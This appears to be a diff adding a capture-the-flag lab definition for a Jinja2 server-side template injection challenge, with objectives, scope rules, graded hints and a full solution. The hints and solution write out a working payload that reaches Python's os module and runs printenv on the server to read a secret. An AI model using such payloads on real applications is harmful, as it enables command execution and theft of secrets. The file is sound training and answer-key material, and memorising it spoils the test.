@@ -1,0 +1,71 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: ssti-greeting
+  title: 'SSTI Greeting'
+  version: 1.0.0
+  difficulty: easy
+  points: 150
+  estimated_minutes: 20
+  tags: [ssti, jinja2, web]
+spec:
+  track: web-foundations
+  type: challenge
+  summary: >-
+    Greeting Card Studio renders personalized cards by feeding the
+    visitor's name straight into a Jinja template string, so anything
+    that looks like template syntax is compiled and executed on the
+    server. You will prove the engine evaluates your input, walk the
+    standard object chain from a template global to Python's os module,
+    and read the service environment variable that holds the room flag.
+  objectives:
+    - 'Confirm server-side template evaluation with an arithmetic payload.'
+    - 'Walk the Jinja object chain from a template global to the os module.'
+    - 'Read ROOM_FLAG from the service environment through the injected template.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'http://target:8000'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: 'Template injection stays inside one disposable container; payloads only read process state.'
+  target:
+    build_context: ./target
+    ports: [8000]
+    healthcheck:
+      http_path: /healthz
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: ssti-render
+      title: 'Make the greeting card execute your template'
+      prompt: >-
+        Submit a recipient name that the card renderer compiles as Jinja
+        code instead of printing. Use it to reach the os module from the
+        template environment, print the ROOM_FLAG environment variable
+        of the service, and submit the FLAG value shown on the card.
+      points: 150
+      hints:
+        - cost: 0
+          text: 'Submit {{7*7}} as the name first. A greeting showing 49 means your input is compiled as template code, not echoed.'
+        - cost: 10
+          text: 'Flask templates expose globals such as cycler and lipsum. Their __globals__ mapping is the module namespace of jinja2.utils, which imports os.'
+        - cost: 25
+          text: "POST name={{ cycler.__init__.__globals__.os.popen('printenv ROOM_FLAG').read() }} to /greet. The rendered card contains FLAG{...}."
+      solution: |
+        1. Open http://target:8000 and submit {{7*7}} as the recipient
+           name. The card greets you with 49, proving the name lands in
+           render_template_string as part of the template source.
+        2. The handler builds f"<h2>Hello {name}...</h2>" before
+           rendering, so {{ ... }} expressions execute server side.
+        3. Template globals bridge out of the sandbox-less Jinja
+           environment: cycler.__init__.__globals__ is the namespace of
+           jinja2.utils, which imports os.
+        4. POST to /greet with name=`{{ cycler.__init__.__globals__.os.
+           popen('printenv ROOM_FLAG').read() }}`. The card prints the
+           flag value. Submit it.
+      validator:
+        type: per_session_flag
